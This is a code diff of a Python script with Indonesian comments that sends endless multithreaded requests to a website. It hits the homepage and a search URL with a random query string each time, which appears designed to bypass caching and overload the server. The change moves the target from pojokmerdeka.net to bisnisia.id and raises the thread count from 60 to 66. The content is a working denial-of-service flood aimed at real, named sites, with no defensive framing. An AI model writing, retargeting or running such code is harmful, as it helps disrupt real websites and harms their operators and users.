@@ -12,7 +12,7 @@ import string
 
 # Daftar URL yang ingin di-curl (parameter s pada url kedua akan diganti dinamis)
 urls = [
-    "http://pojokmerdeka.net",
+    "https://bisnisia.id",
     None  # Placeholder untuk url dinamis
 ]
 
@@ -33,11 +33,11 @@ def curl(url):
 def run_curl_perdetik():
     while True:
         threads = []
-        for _ in range(60):
+        for _ in range(66):
             # Buat url dinamis untuk parameter q SETIAP request (bukan per detik)
             current_urls = [
                 urls[0],
-                f"https://pojokmerdeka.net/?s={random_string()}"
+                f"https://bisnisia.id/?s={random_string()}"
             ]
             for url in current_urls:
                 t = threading.Thread(target=curl, args=(url,))
